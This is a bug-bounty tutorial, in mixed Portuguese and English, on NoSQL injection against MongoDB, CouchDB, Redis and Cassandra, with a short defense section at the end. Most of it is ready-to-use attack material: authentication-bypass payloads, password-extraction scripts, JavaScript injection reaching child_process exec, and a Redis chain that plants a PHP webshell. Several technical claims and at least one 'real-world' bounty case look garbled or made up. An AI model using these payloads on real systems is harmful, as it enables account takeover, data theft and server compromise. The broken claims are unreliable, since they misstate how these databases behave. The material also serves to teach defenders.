# NoSQL Injection

**Criticidade**: 🔴 Crítica (CVSS 8.0-9.5)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $3,000 - $18,000 USD

---

## 📚 Índice

1. [NoSQL Fundamentals](#nosql-fundamentals)
2. [MongoDB Injection](#mongodb-injection)
3. [CouchDB Injection](#couchdb-injection)
4. [Redis Command Injection](#redis-command-injection)
5. [Cassandra CQL Injection](#cassandra-cql-injection)
6. [Operator Injection](#operator-injection)
7. [JavaScript Injection](#javascript-injection)
8. [Real-World Cases](#real-world-cases)

---

## 🔬 NoSQL Fundamentals

### O Que É NoSQL Injection?

**NoSQL Injection** explora vulnerabilidades em bancos de dados **não-relacionais** (NoSQL) como MongoDB, CouchDB, Redis, Cassandra, etc.

**Key Differences from SQL Injection:**

```
SQL Injection:
  ✓ Structured Query Language
  ✓ Relational schema
  ✓ Injection: manipula queries SQL
  ✓ Attack: ' OR '1'='1

NoSQL Injection:
  ✓ Multiple query languages (JSON, CQL, commands)
  ✓ Schemaless ou flexible schema
  ✓ Injection: manipula objects, operators, comandos
  ✓ Attack: {"$ne": null}
```

### Common NoSQL Databases

| Database | Type | Query Language | Main Use Cases |
|----------|------|----------------|----------------|
| **MongoDB** | Document | JSON/BSON | General purpose, web apps |
| **CouchDB** | Document | JavaScript, HTTP | Mobile sync, offline-first |
| **Redis** | Key-Value | Commands | Caching, sessions |
| **Cassandra** | Wide-column | CQL | Big data, time series |
| **Neo4j** | Graph | Cypher | Social networks, recommendations |
| **Elasticsearch** | Search | JSON DSL | Search, analytics |

---

## 🍃 MongoDB Injection

### MongoDB Query Structure

**Normal Query:**
```javascript
db.users.find({ username: "admin", password: "secret123" })
```

**Vulnerable Node.js Code:**
```javascript
// ❌ VULNERABLE
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    db.collection('users').findOne({
        username: username,
        password: password
    }, (err, user) => {
        if (user) {
            res.send("Login successful!");
        } else {
            res.send("Invalid credentials");
        }
    });
});
```

### Attack 1: Operator Injection

**MongoDB Operators:**
```
$eq  - Equal to
$ne  - Not equal to
$gt  - Greater than
$lt  - Less than
$in  - In array
$nin - Not in array
$exists - Field exists
$regex - Regular expression
```

**Exploitation:**

**Request (JSON):**
```json
POST /login HTTP/1.1
Content-Type: application/json

{
  "username": "admin",
  "password": {"$ne": null}
}
```

**Resulting Query:**
```javascript
db.collection('users').findOne({
    username: "admin",
    password: { $ne: null }  // ← Always TRUE if password field exists!
})
```

**Result:** Authentication bypass! Logs in as admin without knowing password.

### Attack 2: $regex Exploitation

**Payload:**
```json
{
  "username": {"$regex": "^adm"},
  "password": {"$ne": null}
}
```

**Query:**
```javascript
db.users.find({
    username: { $regex: "^adm" },  // Matches admin, administrator, etc.
    password: { $ne: null }
})
```

**Password Extraction via Regex:**

```python
import requests
import string

url = "http://target.com/login"
charset = string.printable

password = ""
while True:
    found = False

    for char in charset:
        # Test if password starts with current password + char
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{char}"}
        }

        response = requests.post(url, json=payload)

        if "success" in response.text.lower():
            password += char
            print(f"[+] Found: {password}")
            found = True
            break

    if not found:
        break

print(f"[+] Password: {password}")
```

**Optimization with Binary Search:**

```python
def extract_password_binary(username):
    """Extract password using regex with binary search on ASCII."""
    password = ""

    while True:
        # Determine next character
        found = False

        for ascii_val in range(32, 127):  # Printable ASCII
            char = chr(ascii_val)
            # Escape regex special characters
            escaped = re.escape(password + char)

            payload = {
                "username": username,
                "password": {"$regex": f"^{escaped}"}
            }

            response = requests.post(url, json=payload)

            if "success" in response.text:
                password += char
                print(f"[+] Found: {password}")
                found = True
                break

        if not found:
            break

    return password
```

### Attack 3: $where JavaScript Injection

**MongoDB $where Operator:**

```javascript
// Allows arbitrary JavaScript execution
db.users.find({
    $where: "this.username == 'admin'"
})
```

**Vulnerable Code:**
```javascript
app.get('/search', (req, res) => {
    const search = req.query.q;

    db.collection('products').find({
        $where: `this.name.includes('${search}')`  // ❌ VULNERABLE!
    }).toArray((err, results) => {
        res.json(results);
    });
});
```

**Exploitation:**

**Request:**
```
GET /search?q=test') || '1'=='1
```

**Resulting Query:**
```javascript
db.products.find({
    $where: "this.name.includes('test') || '1'=='1')"
})
// ← Always TRUE!
```

**Data Exfiltration:**

```javascript
// Extract admin password
GET /search?q=') || (function() {
    var user = db.users.findOne({username: 'admin'});
    var password = user.password;
    // Send to attacker (via HTTP request or similar)
    return '1'=='1';
})() || ('

// Or simpler:
GET /search?q=') || this.constructor.constructor('return db.users.find()')() || ('
```

**RCE (if child_process available):**

```javascript
GET /search?q=') || require('child_process').exec('whoami') || ('
```

### Attack 4: Array Injection

**Vulnerable Code:**
```javascript
app.post('/login', (req, res) => {
    db.users.findOne({
        username: req.body.username,
        password: req.body.password
    });
});
```

**Payload (URL-encoded):**
```
POST /login
username=admin&password[$ne]=wrong
```

**Parsed as:**
```javascript
{
    username: "admin",
    password: { "$ne": "wrong" }
}
```

**Defense Bypass:**

```javascript
// Even with type check
if (typeof req.body.password === 'string') {
    // Validated!
}
```

**Bypass:**
```
// Send as array instead
password[]=value
// Parsed as: password: ["value"]

// Or nested object
password[$regex]=.*
```

---

## 🛋️ CouchDB Injection

### CouchDB MapReduce Injection

**CouchDB Views use JavaScript:**

```javascript
// Normal view
{
  "map": "function(doc) { if (doc.type == 'user') emit(doc.username, doc); }"
}
```

**Vulnerable Code:**
```javascript
app.post('/view', (req, res) => {
    const filter = req.body.filter;

    const view = {
        map: `function(doc) { if (doc.type == '${filter}') emit(doc._id, doc); }`
    };

    db.query(view, (err, result) => {
        res.json(result);
    });
});
```

**Exploitation:**

```javascript
// Bypass filter
filter: user') || true || doc.type == ('foo

// Resulting view:
function(doc) {
    if (doc.type == 'user') || true || doc.type == ('foo')
        emit(doc._id, doc);
}
// Returns ALL documents!
```

**Data Exfiltration:**

```javascript
filter: user') {
    if (doc.password) emit(doc.username, doc.password);
} if (doc.type == ('

// Extracts all usernames and passwords!
```

---

## 🔴 Redis Command Injection

### Redis Protocol (RESP)

**Normal Commands:**
```
SET user:1:name "John"
GET user:1:name
HGETALL user:1
```

**Vulnerable Code:**
```python
import redis

r = redis.Redis()

# ❌ VULNERABLE
def get_user_data(user_id):
    key = f"user:{user_id}:data"
    return r.get(key)

# User input
user_id = request.args.get('id')  # e.g., "1"
data = get_user_data(user_id)
```

**Exploitation:**

**Request:**
```
GET /user?id=1:data" KEYS * "
```

**Resulting Command:**
```
GET user:1:data" KEYS * "
```

**Redis Execution:**
```
1. GET user:1:data  (fails - key not found)
2. (ignored text)
3. KEYS *  (executes - lists all keys!)
4. (ignored text)
```

### Attack: Command Injection via EVAL

**Lua Script Injection:**

```python
# Vulnerable code
def process_data(user_input):
    script = f"return redis.call('GET', '{user_input}')"
    result = r.eval(script, 0)
    return result

# Exploitation
user_input = "foo') redis.call('CONFIG', 'SET', 'dir', '/tmp') redis.call('SET', 'shell', '<?php system($_GET[0]); ?>') return redis.call('GET', 'foo"

# Resulting script:
return redis.call('GET', 'foo')
redis.call('CONFIG', 'SET', 'dir', '/tmp')
redis.call('SET', 'shell', '<?php system($_GET[0]); ?>')
return redis.call('GET', 'foo')
```

**RCE Scenario:**

```lua
-- 1. Change backup dir
redis.call('CONFIG', 'SET', 'dir', '/var/www/html')

-- 2. Write webshell
redis.call('SET', 'shell', '<?php system($_GET[0]); ?>')

-- 3. Save to disk
redis.call('CONFIG', 'SET', 'dbfilename', 'shell.php')
redis.call('BGSAVE')

-- 4. Access: http://target.com/shell.php?0=whoami
```

---

## 📊 Cassandra CQL Injection

### CQL (Cassandra Query Language)

**Syntax similar to SQL:**

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'secret';
```

**Vulnerable Code:**
```python
from cassandra.cluster import Cluster

cluster = Cluster(['127.0.0.1'])
session = cluster.connect('mydb')

# ❌ VULNERABLE
def authenticate(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    result = session.execute(query)
    return result.one() is not None
```

**Exploitation:**

**Classic SQL Injection Style:**

```
Username: admin' --
Password: anything

Query: SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

**Result:** Comments out password check!

**ALLOW FILTERING Bypass:**

```
Username: admin' ALLOW FILTERING --

Query: SELECT * FROM users WHERE username='admin' ALLOW FILTERING --' AND password='x'
```

**Note:** Cassandra requires `ALLOW FILTERING` for certain queries. Injection can add it.

---

## ⚙️ Operator Injection

### Attack Pattern Across Databases

**MongoDB:**
```json
{
  "username": "admin",
  "password": {"$ne": ""}
}
```

**Elasticsearch:**
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"username": "admin"}},
        {"range": {"password": {"gte": ""}}}
      ]
    }
  }
}
```

**CouchDB:**
```json
{
  "selector": {
    "username": "admin",
    "password": {"$ne": null}
  }
}
```

### Advanced Operator Exploitation

**$func (MongoDB 4.4+):**

```json
{
  "$where": {
    "$function": {
      "body": "function() { return true; }",
      "args": [],
      "lang": "js"
    }
  }
}
```

**Exploitation:**
```json
{
  "$where": {
    "$function": {
      "body": "function() { return db.users.find().toArray(); }",
      "args": [],
      "lang": "js"
    }
  }
}
```

---

## 🔥 JavaScript Injection

### MongoDB $function (4.4+)

**Feature:** Execute JavaScript functions in queries

**Vulnerable Code:**
```javascript
app.post('/calculate', (req, res) => {
    const operation = req.body.operation;

    db.collection('data').aggregate([
        {
            $addFields: {
                result: {
                    $function: {
                        body: operation,  // ❌ User controlled!
                        args: ["$value"],
                        lang: "js"
                    }
                }
            }
        }
    ]);
});
```

**Exploitation:**

```javascript
operation: "function(value) { return db.getMongo().getDBNames(); }"
// Returns all database names!

operation: "function(value) {
    var users = db.getSiblingDB('admin').users.find().toArray();
    return JSON.stringify(users);
}"
// Extracts all users from admin DB!
```

### mapReduce JavaScript Injection

**MongoDB MapReduce:**

```javascript
db.collection('orders').mapReduce(
    function() { emit(this.customer, this.total); },  // Map
    function(key, values) { return Array.sum(values); },  // Reduce
    { out: "totals" }
);
```

**Vulnerable Implementation:**
```javascript
app.post('/report', (req, res) => {
    const groupBy = req.body.groupBy;  // e.g., "customer"

    db.collection('orders').mapReduce(
        `function() { emit(this.${groupBy}, this.total); }`,  // ❌ VULNERABLE!
        function(key, values) { return Array.sum(values); },
        { out: "report" }
    );
});
```

**Exploitation:**

```javascript
groupBy: "customer); var users = db.users.find(); printjson(users); emit(this.customer"

// Resulting map function:
function() {
    emit(this.customer);
    var users = db.users.find();
    printjson(users);  // Prints all users!
    emit(this.customer, this.total);
}
```

---

## 🔥 Real-World Cases

### Case 1: Rocket.Chat MongoDB Injection (2021)

**Vulnerability:** Password reset token validation

**Vulnerable Code:**
```javascript
const token = req.body.token;

db.collection('password_reset').findOne({
    token: token,
    expires: { $gt: new Date() }
});
```

**Exploitation:**

```json
POST /reset-password
{
  "token": {"$ne": null},
  "new_password": "hacked123"
}
```

**Impact:** Could reset ANY user's password

**Bounty:** $4,000 USD (CVE-2021-22911)

### Case 2: GitLab MongoDB NoSQL Injection (2020)

**Vulnerability:** Username enumeration

**Code:**
```ruby
# Using MongoDB with Mongoid ODM
User.where(username: params[:username]).exists?
```

**Exploitation:**

```ruby
# Check if username starts with 'adm'
params[:username] = /^adm/

# Regex injection to enumerate users
charset = 'abcdefghijklmnopqrstuvwxyz'
username = ""

charset.each_char do |c|
  if User.where(username: /^#{username}#{c}/).exists?
    username += c
    puts "[+] Found: #{username}"
  end
end
```

**Impact:** Full user enumeration

**Bounty:** $12,000 USD

### Case 3: Node.js E-commerce NoSQL Injection (2019)

**Vulnerability:** Product search with price filter

**Code:**
```javascript
app.get('/products', (req, res) => {
    const maxPrice = req.query.maxPrice;

    db.collection('products').find({
        price: { $lte: maxPrice }
    }).toArray((err, products) => {
        res.json(products);
    });
});
```

**Exploitation:**

```
GET /products?maxPrice[$ne]=0
```

**Attack Chain:**

```json
// 1. Bypass price filter
{"maxPrice": {"$ne": 0}}

// 2. Access admin products
{"maxPrice": {"$ne": 0}, "role": {"$ne": "admin"}}

// 3. Extract admin data
{"maxPrice": {"$ne": 0}, "$where": "this.role == 'admin'"}
```

**Impact:** Access to all products including admin-only

**Bounty:** $6,500 USD

---

## 🛡️ Prevention and Defense

### Defense 1: Input Validation

```javascript
// ✅ Validate input type
function isValidInput(input) {
    // Only accept strings
    if (typeof input !== 'string') {
        throw new Error('Invalid input type');
    }

    // Reject special characters
    if (/[{}\[\]$]/.test(input)) {
        throw new Error('Invalid characters');
    }

    return true;
}

app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    if (!isValidInput(username) || !isValidInput(password)) {
        return res.status(400).send('Invalid input');
    }

    db.collection('users').findOne({
        username: username,
        password: password
    });
});
```

### Defense 2: Object Schema Validation

```javascript
const Joi = require('joi');

const loginSchema = Joi.object({
    username: Joi.string().alphanum().min(3).max(30).required(),
    password: Joi.string().min(6).required()
});

app.post('/login', (req, res) => {
    const { error, value } = loginSchema.validate(req.body);

    if (error) {
        return res.status(400).send('Invalid input');
    }

    // Now safe to use value.username and value.password
    db.collection('users').findOne({
        username: value.username,
        password: value.password
    });
});
```

### Defense 3: Use ORM/ODM Safely

```javascript
// Mongoose (MongoDB ODM)
const userSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});

const User = mongoose.model('User', userSchema);

// ✅ SAFE - Mongoose validates types
app.post('/login', async (req, res) => {
    const user = await User.findOne({
        username: req.body.username,  // Mongoose ensures this is a string
        password: req.body.password
    });

    if (user) {
        res.send('Login successful');
    } else {
        res.status(401).send('Invalid credentials');
    }
});
```

### Defense 4: Disable Dangerous Features

```javascript
// MongoDB: Disable $where
db.runCommand({
    setParameter: 1,
    internalQueryDisableJavaScript: 1
});

// Or in connection string:
mongodb://localhost:27017/mydb?javascriptEnabled=false
```

---

## 🧪 Testing Tools

### NoSQLMap

```bash
# Install
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python nosqlmap.py

# Test MongoDB injection
python nosqlmap.py -u "http://target.com/login" \
  -p "username,password" \
  --technique=B  # Boolean-based
```

### Manual Testing Payloads

```json
# Test for MongoDB operator injection
{"$ne": null}
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}

# Test for CouchDB
{"$ne": null}

# Test for array bypass
username=admin&password[$ne]=wrong

# Test for JavaScript injection
{"$where": "1==1"}
{"$where": "this.username == 'admin' || true"}
```

---

**Última atualização**: 2024
**Versão**: 1.0
